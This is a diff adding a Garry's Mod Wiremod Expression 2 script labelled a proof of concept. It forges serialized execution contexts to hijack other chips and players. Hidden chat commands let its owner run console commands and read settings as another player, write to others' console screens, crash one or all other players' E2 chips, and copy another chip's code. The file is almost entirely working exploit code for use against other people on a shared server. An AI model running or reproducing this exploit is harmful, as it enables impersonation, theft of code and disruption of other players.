@@ -1,0 +1,281 @@
+@name Proof Of Concept (Old)
+@inputs
+@outputs 
+@persist XWL:wirelink
+@trigger 
+
+runOnChat(1)
+
+Chars = format("%c%c%c%c%c%c%c%c%c%c%c", 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11)
+S1 = Chars[1]
+S2 = Chars[2]
+S6 = Chars[6]
+S7 = Chars[7]
+S10 = Chars[10]
+S11 = Chars[11]
+EmptyTable = S2 + S1
+
+if (first() | duped()) {
+    gSetGroup("E2POC")
+    gShare(1)
+    # Use of gVars is just to avoid storing data in the e2 entity.
+    EntityString = format("%c%d%c", 10, entity():id(), 1)
+    gSetStr("This", EntityString)
+    
+    gSetEnt("Owner", owner())
+    
+    ContextStringTop = ""
+    ContextStringBottom = ""
+    ContextStringOwner = ""
+    ContextStringQuotaHit = ""
+    ContextStringQuotaZero = ""
+    ContextStringEntity = ""
+    ContextStringVarHeader = ""
+    OriginalContextString = ""
+    
+    ContextStringTop += S2
+        ContextStringTop += S7 + "ccontext" + S1
+            ContextStringTop += S2
+                ContextStringTop += S7 + "vclk" + S1
+                    ContextStringTop += EmptyTable
+                ContextStringTop += S7 + "data" + S1
+                    ContextStringTop += EmptyTable
+                ContextStringTop += S7 + "prfcount" + S1
+                    ContextStringTop += S6 + "0" + S1
+                ContextStringTop += S7 + "prfbench" + S1
+                    ContextStringTop += S6 + "0" + S1
+                ContextStringTop += S7 + "triggercache" + S1
+                    ContextStringTop += EmptyTable
+                ContextStringTop += S7 + "data" + S1
+                    ContextStringTop += S2
+                        ContextStringTop += S7 + "currentsound" + S1
+                            ContextStringTop += EmptyTable
+                        ContextStringTop += S7 + "datasignal" + S1
+                            ContextStringTop += EmptyTable
+                        ContextStringTop += S7 + "EGP" + S1
+                            ContextStringTop += S2
+                                ContextStringTop += S7 + "UpdatesNeeded" + S1
+                                    ContextStringTop += EmptyTable
+                            ContextStringTop += S1
+                        ContextStringTop += S7 + "findnext" + S1
+                            ContextStringTop += S6 + "0" + S1
+                        ContextStringTop += S7 + "gvars" + S1
+                            ContextStringTop += S2
+                                ContextStringTop += S7 + "group" + S1
+                                    ContextStringTop += S7 + "E2POC" + S1
+                                ContextStringTop += S7 + "shared" + S1
+                                    ContextStringTop += S6 + "1" + S1
+                            ContextStringTop += S1
+                        ContextStringTop += S7 + "holos" + S1
+                            ContextStringTop += EmptyTable
+                        ContextStringTop += S7 + "lookup" + S1
+                            ContextStringTop += EmptyTable
+                        ContextStringTop += S7 + "timer" + S1
+                            ContextStringTop += S2
+                                ContextStringTop += S7 + "timerid" + S1
+                                    ContextStringTop += S6 + "0" + S1
+                                ContextStringTop += S7 + "timers" + S1
+                                    ContextStringTop += EmptyTable
+                            ContextStringTop += S1
+                    ContextStringTop += S1
+                ContextStringQuotaHit += S7 + "prf" + S1
+                    ContextStringQuotaHit += S6 + "1e100" + S1
+                ContextStringQuotaZero += S7 + "prf" + S1
+                    ContextStringQuotaZero += S6 + "0" + S1
+                ContextStringOwner += S7 + "player" + S1
+                    ContextStringOwner += S10 + toString(owner():id()) + S1
+                ContextStringEntity += S7 + "entity" + S1
+                    ContextStringEntity += EntityString
+                ContextStringVarHeader += S7 + "vars" + S1
+                    # ContextStringBottom += EmptyTable
+        ContextStringBottom += S1
+    ContextStringBottom += S1
+    
+    OriginalContextString = ContextStringTop + ContextStringQuotaZero + ContextStringOwner + ContextStringEntity
+    OriginalContextString += ContextStringVarHeader + EmptyTable
+    OriginalContextString += ContextStringBottom
+    gSetStr("OriginalContext", OriginalContextString)
+    gSetStr("ContextTop", ContextStringTop)
+    gSetStr("ContextBottom", ContextStringBottom)
+    gSetStr("ContextQuotaZero", ContextStringQuotaZero)
+    gSetStr("ContextQuotaHit", ContextStringQuotaHit)
+    gSetStr("ContextOwner", ContextStringOwner)
+    gSetStr("ContextVarHeader", ContextStringVarHeader)
+    gSetStr("ContextEmptyTable", EmptyTable)
+}
+
+if (dsClk()) {
+    if (gGetStr("State") == "Executing") {
+        if (gGetStr("Command") == "cmd") {
+            concmd(gGetStr("Argument"))
+            print("Running \"" + gGetStr("Argument") + "\" on " + gGetStr("Target"))
+        } elseif (gGetStr("Command") == "cvar") {
+            gSetStr("ConVar", convar(gGetStr("Argument")))
+        } elseif (gGetStr("Command") == "print") {
+            print(gGetStr("Argument"))
+        } elseif (gGetStr("Command") == "hint") {
+            hint(gGetStr("Argument"), 10)
+        }
+        T = glonDecodeTable(gGetStr("This"))
+        T["ontext", complex] = glonDecodeTable(gGetStr("OriginalContext"))["context", complex]
+        gSetStr("State", "Report")
+        dsSendDirect("", entity(), "")
+    } elseif (gGetStr("State") == "Report") {
+        if (gGetStr("Command") == "cmd") {
+            print("Running \"" + gGetStr("Argument") + "\" on " + gGetStr("Target"))
+        } elseif (gGetStr("Command") == "cvar") {
+            print("ConVar " + gGetStr("Argument") + " was " + gGetStr("ConVar"))
+        } elseif (gGetStr("Command") == "print") {
+            print("Printing \"" + gGetStr("Argument") + "\"to " + gGetStr("Target"))
+        } elseif (gGetStr("Command") == "hint") {
+            print("Hinting \"" + gGetStr("Argument") + "\"to " + gGetStr("Target"))
+        }
+        gSetStr("State", "None")
+    } elseif (gGetStr("State") == "ConsoleWrite") {
+        Screen = glonDecodeTable(S10 + toString(XWL:entity():id()) + S1)
+        One = glonDecodeTable(S2 + S7 + "ea" + S1 + S6 + "1" + S1 + S1)["a", entity]
+        Screen["xtended", entity] = One
+        XWL[2041] = 1
+        print("Writing " + gGetStr("Argument"))
+        XWL:writeString(gGetStr("Argument"), 0, 0)
+        T = glonDecodeTable(gGetStr("This"))
+        T["ontext", complex] = glonDecodeTable(gGetStr("OriginalContext"))["context", complex]
+        gSetStr("State", "None")
+    }
+}
+
+# Bug 2
+if (chatClk() & !dsClk()) {
+    if (lastSpoke() == gGetEnt("Owner")) {
+        LastSaid = lastSaid()
+        if (LastSaid:sub(1, 1) == "!") {
+            hideChat(1)
+            LastSaid = LastSaid:sub(2)
+            Parts = LastSaid:explode(" ")
+            Arguments = LastSaid:sub(Parts[1, string]:length() + 2)
+            Command = Parts[1, string]
+            if (Command == "console") {
+                # Hijack a console screen
+                Target = gGetEnt("Owner"):aimEntity()
+                gSetEnt("Target", Target)
+                gSetStr("Argument", Arguments)
+                if (Target:type() == "gmod_wire_consolescreen") {
+                    ConsoleContext = gGetStr("ContextTop") + gGetStr("ContextQuotaZero")
+                    ConsoleContext += gGetStr("ContextOwner")
+                    ConsoleContext += S7 + "entity" + S1
+                    ConsoleContext += gGetStr("This")
+                    ConsoleContext += gGetStr("ContextVarHeader")
+                    ConsoleContext += S2
+                        ConsoleContext += S7 + "XWL" + S1
+                        ConsoleContext += S10 + toString(Target:id()) + S1
+                    ConsoleContext += S1
+                    ConsoleContext += gGetStr("ContextBottom")
+                    T = glonDecodeTable(gGetStr("This"))
+                    T["ontext", complex] = glonDecodeTable(ConsoleContext)["context", complex]
+                    gSetStr("State", "ConsoleWrite")
+                    dsSendDirect("", entity(), "")
+                } else {
+                    print("You are not looking at a console screen.")
+                }
+            } elseif (Command == "cmd" |
+                      Command == "cvar" |
+                      Command == "print" |
+                      Command == "hint") {
+                gSetStr("Command", Command)
+                Player = gGetEnt("Owner"):aimEntity()
+                if (Player:type() != "player") {
+                    Player = noentity()
+                }
+                if (!Player & Parts:count() > 2) {
+                    Player = findPlayerByName(Parts[2, string])
+                    Arguments = Arguments:sub(Parts[2, string]:length() + 2)
+                }
+                if (!Player) {
+                    print("No player found.")
+                } else {
+                    gSetStr("Target", Player:name())
+                    gSetStr("Argument", Arguments)
+                    PlayerContext = gGetStr("ContextTop") + gGetStr("ContextQuotaZero")
+                    PlayerContext += S7 + "player" + S1
+                    PlayerContext += S10 + toString(Player:id()) + S1
+                    PlayerContext += S7 + "entity" + S1
+                    PlayerContext += gGetStr("This")
+                    PlayerContext += gGetStr("ContextVarHeader")
+                    PlayerContext += gGetStr("ContextEmptyTable")
+                    PlayerContext += gGetStr("ContextBottom")
+                    T = glonDecodeTable(gGetStr("This"))
+                    T["ontext", complex] = glonDecodeTable(PlayerContext)["context", complex]
+                    
+                    # Now datasignal
+                    gSetStr("State", "Executing")
+                    dsSendDirect("", entity(), "")
+                }
+            } elseif (Command == "crash" |
+                      Command == "quota") {
+                gSetStr("Command", Command)
+                Target = gGetEnt("Owner"):aimEntity()
+                QuotaHitContext = gGetStr("ContextTop")
+                QuotaHitContext += gGetStr("ContextQuotaHit")
+                QuotaHitContext += S7 + "player" + S1
+                QuotaHitContext += S10 + toString(Target:owner():id()) + S1
+                EntityString = format("%c%d%c", 10, Target:id(), 1)
+                QuotaHitContext += S7 + "entity" + S1 + EntityString
+                QuotaHitContext += gGetStr("ContextVarHeader")
+                QuotaHitContext += gGetStr("ContextEmptyTable")
+                QuotaHitContext += gGetStr("ContextBottom")
+                T = glonDecodeTable(format("%c%d%c", 10, Target:id(), 1))
+                gSetEnt("Target", Target)
+                T["ontext", complex] = glonDecodeTable(QuotaHitContext)["context", complex]
+                
+                # The e2 is dead on the next execution.
+                # Help it on its way.
+                if (gGetStr("Command") == "crash") {
+                    dsSendDirect("Boom", gGetEnt("Target"), "")
+                }
+            } elseif (Command == "crashall" |
+                      Command == "quotaall") {
+                gSetStr("Command", Command)
+                findByClass("gmod_wire_expression2")
+                R = findToArray()
+                QuotaHitContext = gGetStr("ContextTop")
+                QuotaHitContext += gGetStr("ContextQuotaHit")
+                QuotaHitContext += gGetStr("ContextVarHeader")
+                QuotaHitContext += gGetStr("ContextEmptyTable")
+                QuotaHitContext += S7 + "player" + S1
+                for (I = 1, R:count()) {
+                    Entity = R[I, entity]
+                    if (Entity != entity()) {
+                        EntityString = format("%c%d%c", 10, Entity:id(), 1)
+                        T = glonDecodeTable(format("%c%d%c", 10, Entity:id(), 1))
+                        ThisQuotaHitContext = QuotaHitContext
+                        ThisQuotaHitContext += S10 + toString(Entity:owner():id()) + S1
+                        ThisQuotaHitContext += S7 + "entity" + S1
+                        ThisQuotaHitContext += EntityString
+                        ThisQuotaHitContext += gGetStr("ContextBottom")
+                        T["ontext", complex] = glonDecodeTable(ThisQuotaHitContext)["context", complex]
+                        # The e2 is dead on the next execution.
+                        # Help it on its way.
+                        if (gGetStr("Command") == "crashall") {
+                            dsSendDirect("Boom", Entity, "")
+                        }
+                    }
+                }
+            } elseif (Command == "steal") {
+                T = glonDecodeTable(format("%c%d%c", 10, gGetEnt("Owner"):aimEntity():id(), 1))
+                G = table()
+                G["a", bone] = T["uffer", bone]
+                gSetStr("Code", glonEncode(G))
+            } elseif (Command == "mtable") {
+                T = glonDecodeTable(gGetStr("This"))
+                B = array()
+                B:pushBone(T["uffer", bone])
+                S = glonEncode(B)
+                I = 1
+                while (I < S:length()) {
+                    print(S:sub(I, I + 99))
+                    I = I + 100
+                }
+            }
+        }
+    }
+}
